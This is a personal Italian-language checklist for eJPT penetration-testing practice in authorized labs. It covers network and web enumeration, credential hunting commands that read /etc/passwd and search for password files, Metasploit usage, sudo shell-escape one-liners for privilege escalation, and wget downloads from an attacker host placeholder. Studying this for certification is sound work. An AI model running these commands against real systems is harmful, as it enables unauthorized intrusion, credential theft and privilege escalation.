# eJPT Checklist

Checklist personale per la preparazione eJPT e per lo svolgimento di laboratori pratici in ambienti autorizzati.

## 1. Assessment

Obiettivo: capire cosa c'è nella rete e quali target sono attivi.

```bash
ip a
ip route
nmap -sn TARGET/24
nmap -sC -sV TARGET
nmap -p- TARGET
nmap -A TARGET
Service Enumeration

Obiettivo: capire quali servizi possono essere sfruttati.

Controllare:

FTP
SSH
HTTP/HTTPS
SMB
MySQL
Apache/Tomcat
servizi con versioni vulnerabili
Web Enumeration

Obiettivo: trovare directory, file nascosti e possibili credenziali.

gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
Cercare:

login page
backup
config
upload
admin
dev
hidden files
Credential Hunting

Obiettivo: trovare utenti, password, configurazioni o dump.

cat config.php
cat db.sql
cat users.txt
cat /etc/passwd
find / -name "*pass*" 2>/dev/null
find / -name "*config*" 2>/dev/null
Access

Obiettivo: usare credenziali o vulnerabilità per entrare nel sistema.

Esempi:

ssh user@TARGET
ftp TARGET
mysql -h TARGET -u user -p
Exploitation

Obiettivo: sfruttare vulnerabilità note in ambiente autorizzato.

Con Metasploit:

msfconsole
search service
use exploit/...
show options
set RHOSTS TARGET
set LHOST KALI_IP
run
Post-Exploitation

Obiettivo: capire chi sono, dove sono e cosa posso fare.

whoami
id
hostname
uname -a
ip a
ip route
sudo -l
Privilege Escalation

Obiettivo: ottenere privilegi più alti quando possibile.

Controllare:

sudo -l

Esempi:

sudo find . -exec /bin/sh \; -quit
sudo python3 -c 'import os; os.execl("/bin/sh", "sh")'
sudo perl -e 'exec "/bin/sh"'
sudo awk 'BEGIN {system("/bin/sh")}'
sudo vim -c ':!/bin/bash'
Pivoting

Obiettivo: usare una macchina compromessa per raggiungere una rete interna.

Controllare:

ip a
ip route

Cercare:

seconda interfaccia di rete
subnet interne
host non raggiungibili direttamente da Kali
File Transfer

Obiettivo: trasferire file da e verso il target.

Da Kali:

python3 -m http.server 8000

Dal target:

wget http://KALI_IP:8000/file
Final Notes
Enumerare prima di attaccare
Non usare tool a caso
Controllare sempre show options in Metasploit
Non usare 127.0.0.1 come LHOST
Documentare ogni passaggio
Usare solo ambienti autorizzati e controllati
